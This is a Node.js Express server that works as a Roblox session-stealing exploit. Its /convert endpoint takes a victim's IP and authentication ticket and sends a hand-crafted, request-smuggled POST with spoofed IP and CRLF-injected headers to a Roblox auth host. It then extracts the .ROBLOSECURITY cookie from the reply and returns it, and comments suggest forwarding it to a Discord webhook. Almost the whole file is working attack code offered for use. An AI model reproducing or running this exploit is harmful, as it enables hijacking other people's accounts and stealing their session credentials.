const express = require('express');
const axios = require('axios');
const app = express();

const tls = require('tls');
const tlsOptions = {
    host: "auth.roblox.qq.com",
    port: 443
};

app.get('/convert/:ip/:authticket', function(req, res) {
  
    const conn = tls.connect(443, tlsOptions);
    const purl = new URL("https://auth.roblox.com/v1/authentication-ticket/redeem");

    var path = purl.pathname;
    if(purl.hostname === "www.roblox.com"){
        path = "/login%5C.." + path.replace(/\//g, '%5C');
    }

    var payload = "";
    payload += " HTTP/1.1\r\n"
    payload += `Host: ${purl.hostname}\r\n`
    payload += `Content-Length: ${Buffer.byteLength(JSON.stringify({'authenticationTicket': `${req.params.authticket}`}))}\r\n`
    payload += `Roblox-CNP-True-IP: ${req.params.ip}\r\n`
    payload += `RBXAuthenticationNegotiation: 1\r\n`
    payload += `Content-Type: application/json\r\n\r\n`
    payload += `{"authenticationTicket": "${req.params.authticket}"}\r\n`
    payload += "\r\n"

    request = ""
    request += `POST ${path + encodeURI(payload)} HTTP/1.1\r\n`
    request += `Host: auth.roblox.qq.com\r\n`
    request += `Content-Length: 0\r\n`
    request += "\r\n"

    conn.write(request)
    conn.setEncoding('UTF-8')
    conn.on('data', async (data) => {

        const cookie = data.split(' .ROBLOSECURITY=').pop().split(';')[0].replace(/\r?\n|\r/g, " ");
        if(cookie.includes("_|WARNING:")){

            try{
                conn.destroy();
                //send a response or do whatever you want, e.g. sending to a discord webhook
                res.send({Cookie: cookie})
            }catch (err){
                console.log(err)
            }
        }else{
            conn.destroy();
            //send a response or do whatever you want, e.g. sending to a discord webhook 
            res.send({Cookie: "Not Found"})
        }
    })
});


app.listen(8081, function () {
    console.log("Started")
})

async function sendWebhook(message){

    try{
        await axios.post('', {content: message}, {headers: { 'Content-Type': 'application/json' }});
    }catch (error){
        console.log(error)
    }
}